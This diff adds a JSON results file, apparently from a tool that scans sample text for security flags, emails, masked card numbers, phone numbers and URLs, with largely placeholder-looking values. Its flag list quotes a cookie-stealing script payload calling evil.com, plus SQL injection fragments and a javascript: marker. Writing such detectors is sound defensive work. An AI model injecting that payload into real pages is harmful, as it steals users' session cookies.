@@ -1,0 +1,139 @@
+{
+  "generated_at": "2026-09-06T21:02:44.049273+00:00",
+  "security_flags": [
+    {
+      "type": "script_tag",
+      "span": [
+        874,
+        943
+      ],
+      "snippet": "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>"
+    },
+    {
+      "type": "js_pseudo_protocol",
+      "span": [
+        739,
+        750
+      ],
+      "snippet": "javascript:"
+    },
+    {
+      "type": "sql_injection_like",
+      "span": [
+        825,
+        835
+      ],
+      "snippet": "DROP TABLE"
+    },
+    {
+      "type": "sql_injection_like",
+      "span": [
+        841,
+        845
+      ],
+      "snippet": "; --"
+    }
+  ],
+  "emails": [
+    {
+      "value": "sarah.connor88@gmail.com",
+      "category": "general"
+    },
+    {
+      "value": "s.connor@alumni.alueducation.com",
+      "category": "alu_alumni"
+    },
+    {
+      "value": "james_oduya@yahoo.co.uk",
+      "category": "general"
+    },
+    {
+      "value": "registrar@alueducation.com",
+      "category": "alu_official"
+    },
+    {
+      "value": "si-support@si.alueducation.com",
+      "category": "alu_si"
+    },
+    {
+      "value": "jane.doe+newsletter@company.co",
+      "category": "general"
+    },
+    {
+      "value": "student.name@alumni.aluEducation.com",
+      "category": "alu_alumni"
+    },
+    {
+      "value": "fake.mail@alueducation.con",
+      "category": "general"
+    }
+  ],
+  "credit_cards": [
+    {
+      "masked": "**** **** **** 4242",
+      "luhn_valid": true
+    },
+    {
+      "masked": "**** **** **** 0004",
+      "luhn_valid": true
+    }
+  ],
+  "phone_numbers": [
+    {
+      "value": "+1 (415) 555-0192",
+      "extension": null,
+      "digit_count": 11,
+      "plausible_length": true
+    },
+    {
+      "value": "254-722-000111",
+      "extension": null,
+      "digit_count": 12,
+      "plausible_length": true
+    },
+    {
+      "value": "1234-56-78",
+      "extension": null,
+      "digit_count": 8,
+      "plausible_length": true
+    },
+    {
+      "value": "+250 788 123 456",
+      "extension": null,
+      "digit_count": 12,
+      "plausible_length": true
+    },
+    {
+      "value": "(022) 555-0134",
+      "extension": null,
+      "digit_count": 10,
+      "plausible_length": true
+    },
+    {
+      "value": "022.555.0199",
+      "extension": null,
+      "digit_count": 10,
+      "plausible_length": true
+    },
+    {
+      "value": "0788123456",
+      "extension": null,
+      "digit_count": 10,
+      "plausible_length": true
+    },
+    {
+      "value": "+1-800-555-0199",
+      "extension": "4021",
+      "digit_count": 11,
+      "plausible_length": true
+    }
+  ],
+  "urls": [
+    {
+      "value": "https://www.aluglobal.com/support"
+    },
+    {
+      "value": "http://alueducation.com/help?ref=123&lang=en"
+    }
+  ]
+}
